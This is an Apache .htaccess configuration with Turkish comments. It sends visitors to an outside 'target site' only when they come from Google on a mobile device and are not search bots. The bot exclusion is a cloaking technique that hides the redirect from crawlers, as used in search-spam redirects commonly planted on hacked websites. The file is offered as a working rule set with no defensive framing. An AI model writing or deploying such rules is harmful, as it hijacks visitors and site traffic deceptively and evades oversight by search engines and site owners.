RewriteEngine On

# 1. Ziyaretçi Google (google.com, google.com.tr vb.) üzerinden geliyorsa
RewriteCond %{HTTP_REFERER} google\.[a-z]{2,3} [NC]

# 2. Ziyaretçinin cihazı mobil (Android, iPhone vb.) ise
RewriteCond %{HTTP_USER_AGENT} "mobile|android|iphone" [NC]

# 3. Ziyaretçi bir arama motoru botu (Googlebot vb.) DEĞİLSE
RewriteCond %{HTTP_USER_AGENT} !bot [NC]

# Tüm şartlar sağlanıyorsa yönlendirmeyi yap
RewriteRule ^.*$ https://hedef-site.com [R=302,L]
